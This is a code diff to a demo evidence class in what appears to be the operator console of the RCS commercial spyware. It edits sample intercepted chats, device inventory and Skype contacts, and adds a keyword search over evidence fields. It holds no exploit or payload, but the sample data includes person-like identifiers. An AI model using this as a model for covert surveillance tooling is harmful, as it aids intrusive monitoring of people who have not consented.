@@ -1,5 +1,7 @@
 package it.ht.rcs.console.evidence.rest
 {
+	import flash.utils.describeType;
+	
 	import it.ht.rcs.console.agent.rest.DBAgentDemo;
 	import it.ht.rcs.console.evidence.model.Evidence;
 	import it.ht.rcs.console.evidence.model.EvidenceData;
@@ -11,7 +13,6 @@ package it.ht.rcs.console.evidence.rest
 	import mx.collections.ArrayCollection;
 	import mx.rpc.events.ResultEvent;
 	import mx.utils.ObjectUtil;
-  
 
 	public class DBEvidenceDemo implements IDBEvidence
 	{
@@ -30,7 +31,7 @@ package it.ht.rcs.console.evidence.rest
       
       // Jimmy Page (Nashville) a1 desktop
       //chat ! ALERTED
-      new Evidence({_id: 'e24', aid: 'a1', blo: false, da: convertToUnix(new Date(2012,11,03,14,50,51)), dr: convertToUnix(new Date(2012,11,03,14,57,00)), _mid: 0, note: '', rel: 0, type: 'chat', data: new EvidenceData({program: 'Twitter', topic:'Mon Dec 03 13:54:59 +0000 2012', peer:'Twitter', content:'JimmyPage: Going to Nashville this weekend', tr:'JimmyPage: Going to Nashville this weekend'})}),
+      new Evidence({_id: 'e24', aid: 'a1', blo: false, da: convertToUnix(new Date(2012,11,03,14,50,51)), dr: convertToUnix(new Date(2012,11,03,14,57,00)), _mid: 0, note: '', rel: 4, type: 'chat', data: new EvidenceData({program: 'Twitter', topic:'Mon Dec 03 13:54:59 +0000 2012', peer:'Twitter', content:'JimmyPage: Going to Nashville this weekend', tr:'JimmyPage: Going to Nashville this weekend'})}),
       
       //device
       new Evidence({_id: 'e12', aid: 'a1', blo: false, da: convertToUnix(new Date(2012,11,03,14,53,51)), dr: convertToUnix(new Date(2012,11,03,14,58,39)), _mid: 0, note: '', rel: 0, type: 'device', data: new EvidenceData({content:'<br>Processor: 4 x Intel(R) Core(TM) i5-3317U CPU @ 1.70GHz<br>Memory: 1920MB free / 3654MB total (47% used)<br>Disk: 70211MB free / 101828MB total<br>Battery: AC Connected - 55%<br><br>OS Version: Windows 7 Ultimate (64bit)<br>Registered to: Microsoft (Microsoft) {}<br>Locale settings: it_IT (UTC +01:00)<br>Time delta: +00:00:00<br><br>User: RCS Demo {ADMIN}<br>SID: S-1-5-21-1932372789-2859129667-2835794646-1000<br><br>Drive List:<br>C:\ &quot;OS&quot; (disk)<br><br><br>Application List:<br>Intel(R) Rapid Start Technology   (1.0.0.1022)<br>Adobe Flash Player 11 ActiveX   (11.3.300.265)<br>Adobe Flash Player 11 Plugin   (11.5.502.110)<br>Advanced Audio FX Engine   (1.12.05)<br>BlackBerry Desktop Software 6.1   (6.1.0.36)<br>Kaspersky Internet Security 2013   (13.0.1.4190)<br>Mozilla Firefox 16.0.2 (x86 en-US)   (16.0.2)<br>Mozilla Maintenance Service   (16.0.2)<br>Microsoft Office Professional Plus 2010   (14.0.4763.1000)<br>TrueCrypt   (7.1a)<br>Windows Live Essentials   (15.4.3508.1109)<br>Dell DataSafe Local Backup   (9.4.67)<br>Intel(R) USB 3.0 eXtensible Host Controller Driver   (1.0.5.235)<br>Java 7 Update 9   (7.0.90)<br>Windows Live Mesh ActiveX Control for Remote Connections   (15.4.5722.2)<br>Intel(R) Rapid Storage Technology   (11.1.0.1006)<br>Absolute Reminder   (2.0.0.19)<br>Intel(R) Management Engine Components   (8.0.10.1464)<br>Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729   (9.0.30729)<br>Microsoft Silverlight   (4.0.50401.0)<br>Intel(R) WiDi   (3.0.12.0)<br>Microsoft Office   (14.0.6120.5004)<br>Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.17   (9.0.30729)<br>Dell Digital Delivery   (2.1.1002.0)<br>Dell DataSafe Local Backup - Support Software   (9.4.67)<br>Adobe Reader X MUI   (10.0.0)<br>Skype™ 6.0   (6.0.126)<br>Microsoft SQL Server 2005 Compact Edition [ENU]   (3.1.0000)<br>Microsoft Visual C++ 2010  x86 Redistributable - 10.0.40219   (10.0.40219)<br>Intel(R) Processor Graphics   (8.15.10.2761)<br>Realtek High Definition Audio Driver   (6.0.1.6662)<br>Intel(R) Control Center   (1.2.1.1007)<br>Microsoft Visual C++ 2008 Redistributable - x86 9.0.21022   (9.0.21022)<br><br><br>Application List:<br>Dell Support Center   (3.1.5907.16)<br>Microsoft .NET Framework 4 Client Profile   (4.0.30319)<br>Microsoft .NET Framework 4 Extended   (4.0.30319)<br>Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219   (10.0.40219)<br>Intel(R) Wireless Display<br>Intel(R) PROSet/Wireless Software for Bluetooth(R) Technology   (2.1.1.0153)<br>Intel(R) PROSet/Wireless for Bluetooth(R) + High Speed   (15.1.0.0096)<br>Intel® PROSet/Wireless WiFi Software   (15.01.1000.0927)<br>Cypress TrackPad   (2.5.0.43)<br>Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.17   (9.0.30729)<br>Quickset64   (11.1.27)<br>Dell Edoc Viewer   (1.0.0)<br>Intel(R) Smart Connect Technology 3.0 x64   (3.0.30.1526)<br>'})}),
@@ -81,7 +82,7 @@ package it.ht.rcs.console.evidence.rest
       
       //addressbook
       new Evidence({_id: 'e14', aid: 'a1', blo: false, da: convertToUnix(new Date(2012,11,03,14,57,55)), dr: convertToUnix(new Date(2012,11,03,14,58,54)), _mid: 0, note: '', rel: 0, type: 'addressbook', data: new EvidenceData({name:'alberto.ornaghi',contact:'', info:'Screen name: Alberto Ornaghi', program:'skype', type:'peer'})}),
-      new Evidence({_id: 'e15', aid: 'a1', blo: false, da: convertToUnix(new Date(2012,11,03,14,57,55)), dr: convertToUnix(new Date(2012,11,03,14,58,54)), _mid: 0, note: '', rel: 0, type: 'addressbook', data: new EvidenceData({name:'quequero_uic',contact:'', info:'Screen name: Quequero', program:'skype', type:'peer'})}),
+      //new Evidence({_id: 'e15', aid: 'a1', blo: false, da: convertToUnix(new Date(2012,11,03,14,57,55)), dr: convertToUnix(new Date(2012,11,03,14,58,54)), _mid: 0, note: '', rel: 0, type: 'addressbook', data: new EvidenceData({name:'//ro_uic',contact:'', info:'Screen name: Quequero', program:'skype', type:'peer'})}),
       new Evidence({_id: 'e16', aid: 'a1', blo: false, da: convertToUnix(new Date(2012,11,03,14,57,55)), dr: convertToUnix(new Date(2012,11,03,14,58,54)), _mid: 0, note: '', rel: 0, type: 'addressbook', data: new EvidenceData({name:'bmuschitiello.cons.mi',contact:'', info:'Screen name: Bruno', program:'skype', type:'peer'})}),
       
       //camera
@@ -122,7 +123,7 @@ package it.ht.rcs.console.evidence.rest
       
       //chat
   
-      new Evidence({_id: 'e26', aid: 'a1', blo: false, da:  convertToUnix(new Date(2012,11,03,15,10,09)), dr:  convertToUnix(new Date(2012,11,03,15,10,48)), _mid: 0, note: '', rel: 0, type: 'chat', data: new EvidenceData({program: 'SKYPE', topic:'', peer:'alberto.ornaghi proc.test', content:'alberto.ornaghi: posted file secret_op.tc to members of this conversation', tr:'alberto.ornaghi: posted file secret_op.tc to members of this conversation'})}),
+      new Evidence({_id: 'e26', aid: 'a1', blo: false, da:  convertToUnix(new Date(2012,11,03,15,10,09)), dr:  convertToUnix(new Date(2012,11,03,15,10,48)), _mid: 0, note: '', rel: 0, type: 'chat', data: new EvidenceData({program: 'SKYPE', topic:'', peer:'alberto.ornaghi jimmy.page', content:'alberto.ornaghi: posted file secret_op.tc to members of this conversation', tr:'alberto.ornaghi: posted file secret_op.tc to members of this conversation'})}),
       
       //url
       new Evidence({_id: 'e27', aid: 'a1', blo: false, da: convertToUnix(new Date(2012,11,03,15,14,36)), dr: convertToUnix(new Date(2012,11,03,15,14,46)), _mid: 0, note: '', rel: 0, type: 'url', data: new EvidenceData({url:'http://www.facebook.com/messages/', title:'Messaggi - Mozilla Firefox', program:'Firefox', keywords:''})}),
@@ -256,10 +257,36 @@ package it.ht.rcs.console.evidence.rest
         if(criteria=="rel" && !isInArray(item.rel, filter.rel)) {result=false; break};
         if(criteria=="aid" && !isInArray(item.aid, filter.aid)) {result=false; break;}
         if(criteria=="date" && !isInDateRange(item, filter)) {result=false; break;}
+        if(criteria=="info") {result=searchForKeyword(item.data,filter.info); break;}
+        
       }
 			return result;
       
 		}
+    
+    private function searchForKeyword(data:Object, keyword:String=""):Boolean
+    {
+      //loop item.data
+      var result:Boolean=false;
+      //address - complex
+      //cell -complex
+      //wifi - complex
+      var props:Array=["_grid", "_grid_size", "access", "accuracy","action", "attach","attr", "begin", "body","command", "contact", "content", "tr", "desc", "duration", "end", "event", "from", "info", "ip", "keywords", "latitude", "longitude", "name", "pass", "path", "peer", "process", "program", "rcpt", "resolution", "service", "size", "spool", "status", "subject", "title", "topic", "type", "url", "user", "users", "window", "x", "y"]
+
+     
+      for (var i:int=0;i<props.length;i++) {
+        if(data.hasOwnProperty( [props[i]]))
+        {
+          var s:String=data[props[i]] as String || "";
+       
+          if(s.toLowerCase().indexOf(keyword.toLowerCase())!=-1)
+          return true;
+        
+        }
+      }
+        //return text.indexOf(keyword)!=-1;
+      return result;
+    }
     
     private function filterCommands(item:Object):Boolean
     {
